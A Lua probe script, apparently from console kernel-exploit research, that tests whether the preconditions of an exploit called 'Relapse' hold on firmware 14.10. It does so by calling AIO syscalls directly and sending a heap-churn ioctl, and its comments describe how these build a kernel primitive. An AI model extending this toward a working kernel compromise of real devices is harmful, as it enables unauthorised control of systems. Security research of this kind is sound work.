-- CRASH_CLASS: MODERATE
-- PROBE 778a: do the Relapse kernel-stage preconditions hold on 14.10?
--
-- Context: the released Relapse exploit (.local/relapse/relapse_exploit.js)
-- builds its kernel primitive from three syscall behaviours:
--   1. aio_submit_cmd(cmd=1, request, 1, mode=3, idOut) really submits a read
--      and the request stays pending (state 1) while the socket has no data;
--   2. ioctl(fd=-1, 0x80000000|((n*0x28)<<16)|0x4101, buf) returns -1 but
--      still allocates and copies our buffer (the heap churn);
--   3. aio_multi_wait(ids, count, states, 0, timeout) parks the caller for the
--      timeout and links a waiter array into those pending requests.
-- This probe measures all three on 14.10 without corrupting anything: one
-- pending request, one churn-sized ioctl, one short wait, then cancel+delete.

print("=== PROBE 778a: RELAPSE PRECONDITIONS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
local function hx(v) return string.format("%08X", to_num(v) % 4294967296) end
local function now_ms()
    local t = os.time()
    return t
end

local D      = to_num(memory.alloc(0x4000))
local sink   = to_num(memory.alloc(0x1000))
local req    = to_num(memory.alloc(0x1000))
local ids    = to_num(memory.alloc(0x100))
local states = to_num(memory.alloc(0x100))
local idout  = to_num(memory.alloc(0x40))
local tospec = to_num(memory.alloc(0x40))
for i = 0, 0x3FF do wd(D + i * 4, 0) end
for i = 0, 0x3FF do wd(req + i * 4, 0) end

local SOCKETPAIR, IOCTL = 135, 54
local AIO_DEL, AIO_WAIT, AIO_POLL, AIO_CANCEL, AIO_SUBMIT = 662, 663, 664, 666, 669

local fds = to_num(memory.alloc(64))
local rv = sgn(make_syscall(SOCKETPAIR)(U(1), U(1), U(0), U(fds), Z, Z))
local rfd = rd(fds)
print(string.format("[0] socketpair rv=%d read-fd=%d", rv, rfd))
if rv ~= 0 then return end

-- [A] submit a read on the empty socket: must stay pending (state 1)
wq(req + 0x00, Z)
wq(req + 0x08, U(16))
wq(req + 0x10, U(sink))
wq(req + 0x18, U(sink + 0x40))
wd(req + 0x20, rfd)
wd(req + 0x24, 0)
local idsub = sgn(make_syscall(AIO_SUBMIT)(U(1), U(req), U(1), U(3), U(idout), Z))
local id = rd(idout)
print(string.format("[A] submit ret=%d id=%s", idsub, hx(id)))

local function poll1(x)
    wd(ids, x)
    wd(states, 0xDEADBEEF)
    local r = sgn(make_syscall(AIO_POLL)(U(ids), U(1), U(states), Z, Z, Z))
    return r, rd(states)
end
local pr, ps = poll1(id)
print(string.format("[A2] poll ret=%d state=%s", pr, hx(ps)))
local spin = 0
for i = 1, 200000 do spin = spin + 1 end
pr, ps = poll1(id)
print(string.format("[A3] poll after busy-wait ret=%d state=%s", pr, hx(ps)))

-- [B] the churn ioctl: fd -1, size in bits 16..29, group 0x41 num 1
local churn = to_num(memory.alloc(0x1000))
for i = 0, 0x3FF do wd(churn + i * 4, 0x41414141) end
local nreq = 13
local cmd = 2147483648 + nreq * 0x28 * 0x10000 + 0x4101
for _, shape in ipairs({ {"-1", 0xFFFFFFFF}, {"real-fd", rfd} }) do
    local r2 = sgn(make_syscall(IOCTL)(U(shape[2]), U(cmd), U(churn), Z, Z, Z))
    print(string.format("[B] churn %s cmd=%s ret=%d", shape[1], hx(cmd), r2))
end

-- [C] multi_wait against the still-pending id, 100 ms timeout
wd(tospec + 0, 0)
wd(tospec + 4, 100000)
wd(tospec + 8, 0)
wd(tospec + 12, 0)
wd(ids, id)
wd(states, 0xDEADBEEF)
local t0 = now_ms()
local wr = sgn(make_syscall(AIO_WAIT)(U(ids), U(1), U(states), Z, U(tospec), Z))
local t1 = now_ms()
print(string.format("[C] multi_wait ret=%d states=%s elapsed<=%ds", wr, hx(rd(states)), (t1 - t0) + 1))

pr, ps = poll1(id)
print(string.format("[C2] poll after wait ret=%d state=%s", pr, hx(ps)))

-- [D] cancel, poll again, then delete whatever is left
local cr = sgn(make_syscall(AIO_CANCEL)(U(ids), U(1), U(states), Z, Z, Z))
print(string.format("[D] cancel ret=%d states=%s", cr, hx(rd(states))))
pr, ps = poll1(id)
print(string.format("[D2] poll after cancel ret=%d state=%s", pr, hx(ps)))
wd(ids, id)
local dr = sgn(make_syscall(AIO_DEL)(U(ids), U(1), U(states), Z, Z, Z))
print(string.format("[E] delete ret=%d status=%s", dr, hx(rd(states))))

-- [F] a fresh create/poll/delete to prove the table is still healthy
wd(D, 0)
wq(D + 0x00, Z); wq(D + 0x08, U(16)); wq(D + 0x10, U(sink)); wq(D + 0x18, U(sink + 0x40))
wd(D + 0x20, rfd); wd(D + 0x24, 0)
local hc = sgn(make_syscall(AIO_SUBMIT)(U(1), U(D), U(1), U(3), U(idout), Z))
local hid = rd(idout)
local hp, hs = poll1(hid)
wd(ids, hid)
local hd = sgn(make_syscall(AIO_DEL)(U(ids), U(1), U(states), Z, Z, Z))
print(string.format("[F] health create=%d id=%s poll=%s delete=%d status=%s",
    hc, hx(hid), hx(hs), hd, hx(rd(states))))
print("=== PROBE 778a DONE ===")
